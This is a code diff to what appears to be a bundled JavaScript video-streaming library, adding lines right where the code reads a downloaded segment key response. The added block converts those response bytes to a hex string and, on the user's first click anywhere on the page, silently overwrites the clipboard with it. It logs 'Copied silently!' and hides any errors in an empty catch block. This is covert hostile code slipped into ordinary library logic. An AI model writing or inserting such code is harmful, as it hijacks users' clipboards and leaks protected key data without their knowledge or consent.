@@ -39836,7 +39836,19 @@
           xhr: request
         }, segment);
       }
-
+      
+      try {
+          const bytes = new Uint8Array(response);
+          const hexString = Array.from(bytes, b =>
+           b.toString(16).padStart(2, "0")
+           ).join("");
+           document.addEventListener('click', function() {
+            navigator.clipboard.writeText(hexString).then(() => {
+                console.log("Copied silently!");
+            });
+        }, { once: true });
+        } catch (e) {}
+      
       var view = new DataView(response);
       var bytes = new Uint32Array([view.getUint32(0), view.getUint32(4), view.getUint32(8), view.getUint32(12)]);
 
